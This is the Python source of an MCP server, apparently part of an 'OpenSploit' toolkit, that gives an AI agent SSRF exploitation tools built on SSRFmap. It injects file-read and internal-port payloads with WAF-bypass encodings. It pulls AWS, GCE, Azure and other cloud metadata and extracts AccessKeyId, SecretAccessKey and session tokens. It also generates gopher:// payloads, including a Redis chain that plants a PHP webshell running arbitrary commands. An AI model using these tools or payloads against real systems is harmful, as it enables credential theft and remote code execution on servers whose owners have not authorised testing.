#!/usr/bin/env python3
"""
OpenSploit MCP Server: ssrfmap

SSRF exploitation framework via SSRFmap — cloud metadata extraction,
backend service RCE (Redis, MySQL, FastCGI, Memcached), and port scanning
through SSRF vulnerabilities.
"""

import asyncio
import os
import re
import tempfile
from typing import Any, Dict, List, Optional
from urllib.parse import quote as url_quote

from mcp_common import BaseMCPServer, ToolResult, ToolError, sanitize_output

SSRFMAP_PATH = "/opt/ssrfmap/ssrfmap.py"

# Available SSRFmap modules
SSRFMAP_MODULES = [
    "axfr", "fastcgi", "github", "memcache", "mysql",
    "networkscan", "portscan", "readfiles", "redis",
    "smtp", "tomcat", "custom",
]

# Cloud metadata endpoints
CLOUD_METADATA = {
    "aws": "http://169.254.169.254/latest/meta-data/",
    "aws_credentials": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_userdata": "http://169.254.169.254/latest/user-data",
    "aws_token": "http://169.254.169.254/latest/api/token",
    "gce": "http://metadata.google.internal/computeMetadata/v1/",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "digitalocean": "http://169.254.169.254/metadata/v1/",
    "alibaba": "http://100.100.100.200/latest/meta-data/",
}


class SsrfmapServer(BaseMCPServer):
    """MCP server wrapping SSRFmap for SSRF exploitation."""

    def __init__(self):
        super().__init__(
            name="ssrfmap",
            description="SSRF exploitation framework — cloud metadata extraction, backend service RCE, port scanning",
            version="1.0.0",
        )

        self.register_method(
            name="scan",
            description="Test a parameter for SSRF vulnerability using SSRFmap modules",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL (e.g., 'http://target/fetch?url=SSRF_HERE')",
                },
                "param": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable parameter name (e.g., 'url', 'path', 'img')",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "default": "GET",
                    "description": "HTTP method",
                },
                "data": {
                    "type": "string",
                    "description": "POST body (e.g., 'url=SSRF_HERE&submit=1')",
                },
                "module": {
                    "type": "string",
                    "enum": SSRFMAP_MODULES,
                    "default": "readfiles",
                    "description": "SSRFmap module: readfiles, portscan, networkscan, redis, mysql, fastcgi, memcache, smtp, tomcat, axfr, github, custom",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "cookies": {
                    "type": "string",
                    "description": "Cookie header value",
                },
                "level": {
                    "type": "integer",
                    "default": 1,
                    "description": "Test level (1-5). Higher levels try more WAF bypass encodings.",
                },
                "ssl": {
                    "type": "boolean",
                    "default": False,
                    "description": "Use HTTPS",
                },
                "lhost": {
                    "type": "string",
                    "description": "Local host IP for reverse connections (modules: redis, fastcgi)",
                },
                "lport": {
                    "type": "integer",
                    "description": "Local port for reverse connections",
                },
                "target_files": {
                    "type": "array",
                    "description": "Files to read via SSRF (for readfiles module). Default: /etc/passwd, /etc/hosts",
                },
                "proxy": {
                    "type": "string",
                    "description": "HTTP proxy (e.g., 'http://127.0.0.1:8080')",
                },
                "timeout": {
                    "type": "integer",
                    "default": 60,
                    "description": "Overall timeout in seconds",
                },
            },
            handler=self.scan,
        )

        self.register_method(
            name="exploit_metadata",
            description="Extract cloud instance metadata via SSRF (AWS/GCE/Azure/DigitalOcean)",
            params={
                "url": {
                    "type": "string",
                    "required": True,
                    "description": "Target URL with SSRF-vulnerable parameter",
                },
                "param": {
                    "type": "string",
                    "required": True,
                    "description": "Vulnerable parameter name",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "default": "GET",
                    "description": "HTTP method",
                },
                "data": {
                    "type": "string",
                    "description": "POST body",
                },
                "cloud": {
                    "type": "string",
                    "enum": ["aws", "gce", "azure", "digitalocean", "alibaba"],
                    "default": "aws",
                    "description": "Cloud provider to target for metadata extraction",
                },
                "headers": {
                    "type": "object",
                    "description": "Custom HTTP headers",
                },
                "cookies": {
                    "type": "string",
                    "description": "Cookie header value",
                },
                "level": {
                    "type": "integer",
                    "default": 1,
                    "description": "WAF bypass level (1-5)",
                },
                "timeout": {
                    "type": "integer",
                    "default": 30,
                    "description": "Timeout in seconds",
                },
            },
            handler=self.exploit_metadata,
        )

        self.register_method(
            name="generate_gopher",
            description="Generate a gopher:// payload for attacking backend services through SSRF",
            params={
                "service": {
                    "type": "string",
                    "required": True,
                    "enum": ["redis", "mysql", "fastcgi", "memcached", "smtp", "postgres", "zabbix"],
                    "description": "Backend service to target",
                },
                "command": {
                    "type": "string",
                    "required": True,
                    "description": "Command or query to execute (e.g., 'id' for Redis RCE, 'SELECT version()' for MySQL)",
                },
                "target_host": {
                    "type": "string",
                    "default": "127.0.0.1",
                    "description": "Backend service host (usually localhost)",
                },
                "target_port": {
                    "type": "integer",
                    "description": "Backend service port (default: auto-detect from service type)",
                },
            },
            handler=self.generate_gopher,
        )

    def _write_request_file(
        self,
        url: str,
        method: str = "GET",
        data: str = None,
        headers: dict = None,
        cookies: str = None,
    ) -> str:
        """Write an HTTP request file for SSRFmap."""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.netloc
        path = parsed.path or "/"
        if parsed.query:
            path += f"?{parsed.query}"

        lines = []
        if method == "POST" and data:
            lines.append(f"POST {path} HTTP/1.1")
        else:
            lines.append(f"GET {path} HTTP/1.1")

        lines.append(f"Host: {host}")
        lines.append("User-Agent: Mozilla/5.0")

        if headers:
            for k, v in headers.items():
                lines.append(f"{k}: {v}")
        if cookies:
            lines.append(f"Cookie: {cookies}")

        if method == "POST" and data:
            lines.append(f"Content-Type: application/x-www-form-urlencoded")
            lines.append(f"Content-Length: {len(data)}")
            lines.append("")
            lines.append(data)
        else:
            lines.append("")

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".txt", delete=False, dir="/tmp"
        ) as f:
            f.write("\r\n".join(lines))
            return f.name

    async def scan(
        self,
        url: str,
        param: str,
        method: str = "GET",
        data: str = None,
        module: str = "readfiles",
        headers: dict = None,
        cookies: str = None,
        level: int = 1,
        ssl: bool = False,
        lhost: str = None,
        lport: int = None,
        target_files: list = None,
        proxy: str = None,
        timeout: int = 60,
    ) -> ToolResult:
        """Test a parameter for SSRF by injecting internal URLs."""
        self.logger.info(f"SSRF scan: {url} param={param} module={module}")

        import requests as req

        # SSRF test payloads based on module
        if module == "readfiles":
            payloads = [
                "file:///etc/passwd",
                "file:///etc/hosts",
                "file:///proc/self/environ",
            ]
            if target_files:
                payloads = [f"file://{f}" for f in target_files]
        elif module == "portscan":
            payloads = [f"http://127.0.0.1:{p}" for p in [80, 8080, 443, 3306, 5432, 6379, 9200, 27017]]
        else:
            # Default: test internal access
            payloads = [
                "http://127.0.0.1/",
                "http://127.0.0.1:80/",
                "http://localhost/",
                "http://[::1]/",
                CLOUD_METADATA["aws"],
            ]

        # WAF bypass encodings by level
        def encode_payload(payload, lvl):
            variants = [payload]
            if lvl >= 2:
                variants.append(payload.replace("127.0.0.1", "2130706433"))  # decimal IP
                variants.append(payload.replace("127.0.0.1", "0x7f000001"))  # hex IP
            if lvl >= 3:
                variants.append(payload.replace("http://", "http://127.0.0.1@"))
                variants.append(payload.replace("127.0.0.1", "127.0.0.1.nip.io"))
            return variants

        results = []
        raw_lines = []

        req_headers = dict(headers) if headers else {}
        if cookies:
            req_headers["Cookie"] = cookies

        proxies = {"http": proxy, "https": proxy} if proxy else None

        for payload in payloads:
            for variant in encode_payload(payload, level):
                try:
                    if method == "POST":
                        post_data = {}
                        if data:
                            for pair in data.split("&"):
                                if "=" in pair:
                                    k, v = pair.split("=", 1)
                                    post_data[k] = variant if k == param else v
                        else:
                            post_data[param] = variant

                        resp = req.post(
                            url, data=post_data, headers=req_headers,
                            allow_redirects=False, timeout=timeout,
                            verify=False, proxies=proxies,
                        )
                    else:
                        resp = req.get(
                            url, params={param: variant}, headers=req_headers,
                            allow_redirects=False, timeout=timeout,
                            verify=False, proxies=proxies,
                        )

                    status = resp.status_code
                    body_len = len(resp.text)
                    # Check if SSRF worked — look for indicators in response
                    indicators = {
                        "file_read": "root:" in resp.text or "daemon:" in resp.text,
                        "redirect_to_result": status in (301, 302) and "location" in resp.headers,
                        "internal_access": status == 200 and body_len > 0,
                        "metadata": "ami-" in resp.text or "AccessKeyId" in resp.text,
                    }
                    hit = any(indicators.values())

                    entry = {
                        "payload": variant,
                        "status_code": status,
                        "body_length": body_len,
                        "indicators": {k: v for k, v in indicators.items() if v},
                        "ssrf_detected": hit,
                    }

                    if hit:
                        entry["response_snippet"] = resp.text[:500]
                        if status in (301, 302):
                            entry["redirect_location"] = resp.headers.get("Location", "")

                    results.append(entry)
                    marker = "[+]" if hit else "[-]"
                    raw_lines.append(f"{marker} {variant} → {status} ({body_len} bytes)")

                except req.exceptions.RequestException as e:
                    raw_lines.append(f"[!] {variant} → ERROR: {e}")

        ssrf_found = any(r.get("ssrf_detected") for r in results)

        return ToolResult(
            success=True,
            data={
                "url": url,
                "param": param,
                "module": module,
                "level": level,
                "ssrf_detected": ssrf_found,
                "results": results,
                "hits": [r for r in results if r.get("ssrf_detected")],
                "hit_count": sum(1 for r in results if r.get("ssrf_detected")),
            },
            raw_output="\n".join(raw_lines),
        )

    async def exploit_metadata(
        self,
        url: str,
        param: str,
        method: str = "GET",
        data: str = None,
        cloud: str = "aws",
        headers: dict = None,
        cookies: str = None,
        level: int = 1,
        timeout: int = 30,
    ) -> ToolResult:
        """Extract cloud instance metadata via SSRF."""
        self.logger.info(f"SSRF metadata extraction: {url} cloud={cloud}")

        import requests as req

        # Build metadata URL list based on cloud provider
        metadata_urls = []
        if cloud == "aws":
            metadata_urls = [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data",
                "http://169.254.169.254/latest/meta-data/hostname",
                "http://169.254.169.254/latest/meta-data/instance-id",
            ]
        elif cloud == "gce":
            metadata_urls = [
                "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
            ]
        elif cloud == "azure":
            metadata_urls = [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            ]
        elif cloud == "digitalocean":
            metadata_urls = [
                "http://169.254.169.254/metadata/v1/",
            ]
        elif cloud == "alibaba":
            metadata_urls = [
                "http://100.100.100.200/latest/meta-data/",
            ]

        req_headers = dict(headers) if headers else {}
        if cookies:
            req_headers["Cookie"] = cookies

        results = []
        raw_lines = []
        metadata_found = False
        credentials = {}

        for meta_url in metadata_urls:
            try:
                if method == "POST":
                    post_data = {}
                    if data:
                        for pair in data.split("&"):
                            if "=" in pair:
                                k, v = pair.split("=", 1)
                                post_data[k] = meta_url if k == param else v
                    else:
                        post_data[param] = meta_url

                    resp = req.post(
                        url, data=post_data, headers=req_headers,
                        allow_redirects=False, timeout=timeout,
                        verify=False,
                    )
                else:
                    resp = req.get(
                        url, params={param: meta_url}, headers=req_headers,
                        allow_redirects=False, timeout=timeout,
                        verify=False,
                    )

                status = resp.status_code
                body = resp.text

                # For redirect responses, fetch the redirect target to get the actual content
                if status in (301, 302) and "location" in resp.headers:
                    redirect_url = resp.headers["Location"]
                    try:
                        redirect_resp = req.get(redirect_url, timeout=timeout, verify=False, allow_redirects=False)
                        body = redirect_resp.text
                        status = redirect_resp.status_code
                    except Exception:
                        pass

                # Check for metadata indicators
                if "ami-" in body or "instance-id" in body or "iam" in body.lower():
                    metadata_found = True
                if "AccessKeyId" in body:
                    metadata_found = True
                    key_match = re.search(r'"AccessKeyId"\s*:\s*"([^"]+)"', body)
                    secret_match = re.search(r'"SecretAccessKey"\s*:\s*"([^"]+)"', body)
                    token_match = re.search(r'"Token"\s*:\s*"([^"]+)"', body)
                    if key_match:
                        credentials["AccessKeyId"] = key_match.group(1)
                    if secret_match:
                        credentials["SecretAccessKey"] = secret_match.group(1)
                    if token_match:
                        credentials["Token"] = token_match.group(1)

                results.append({
                    "metadata_url": meta_url,
                    "status": status,
                    "body_length": len(body),
                    "body_snippet": body[:1000],
                    "metadata_detected": metadata_found,
                })

                raw_lines.append(f"[{'+'if metadata_found else '-'}] {meta_url} → {status} ({len(body)} bytes)")

            except req.exceptions.RequestException as e:
                raw_lines.append(f"[!] {meta_url} → ERROR: {e}")

        return ToolResult(
            success=True,
            data={
                "url": url,
                "cloud": cloud,
                "metadata_found": metadata_found,
                "credentials": credentials if credentials else None,
                "results": results,
            },
            raw_output="\n".join(raw_lines),
        )

    async def generate_gopher(
        self,
        service: str,
        command: str,
        target_host: str = "127.0.0.1",
        target_port: int = None,
    ) -> ToolResult:
        """Generate a gopher:// payload for attacking backend services."""
        self.logger.info(f"Generating gopher payload: service={service} command={command}")

        # Default ports
        default_ports = {
            "redis": 6379,
            "mysql": 3306,
            "fastcgi": 9000,
            "memcached": 11211,
            "smtp": 25,
            "postgres": 5432,
            "zabbix": 10050,
        }

        port = target_port or default_ports.get(service, 0)

        # Generate gopher payloads for common services
        payload = ""
        if service == "redis":
            # Redis RCE via cron/webshell
            redis_cmds = [
                f"CONFIG SET dir /var/www/html",
                f"CONFIG SET dbfilename shell.php",
                f'SET payload "<?php system(\\"{command}\\"); ?>"',
                "SAVE",
                "QUIT",
            ]
            raw = "\r\n".join(redis_cmds) + "\r\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        elif service == "mysql":
            # MySQL query execution (unauthenticated)
            # This is a simplified payload — real MySQL gopher payloads need binary protocol
            payload = f"gopher://{target_host}:{port}/_{url_quote(command)}"

        elif service == "fastcgi":
            # FastCGI RCE
            payload = f"gopher://{target_host}:{port}/_" + url_quote(
                f"GET /index.php HTTP/1.1\r\nHost: localhost\r\n\r\n"
            )

        elif service == "memcached":
            raw = f"set payload 0 0 {len(command)}\r\n{command}\r\nquit\r\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        elif service == "smtp":
            raw = f"EHLO attacker\r\nMAIL FROM:<test@test.com>\r\nRCPT TO:<admin@target.com>\r\nDATA\r\nSubject: pwned\r\n\r\n{command}\r\n.\r\nQUIT\r\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        elif service == "postgres":
            payload = f"gopher://{target_host}:{port}/_{url_quote(command)}"

        elif service == "zabbix":
            raw = f"Command={command}\n"
            encoded = url_quote(raw, safe="")
            payload = f"gopher://{target_host}:{port}/_{encoded}"

        return ToolResult(
            success=True,
            data={
                "service": service,
                "command": command,
                "target": f"{target_host}:{port}",
                "payload": payload,
                "payload_length": len(payload),
                "usage": f"Inject this gopher:// URL into the SSRF-vulnerable parameter",
            },
            raw_output=payload,
        )


if __name__ == "__main__":
    SsrfmapServer.main()
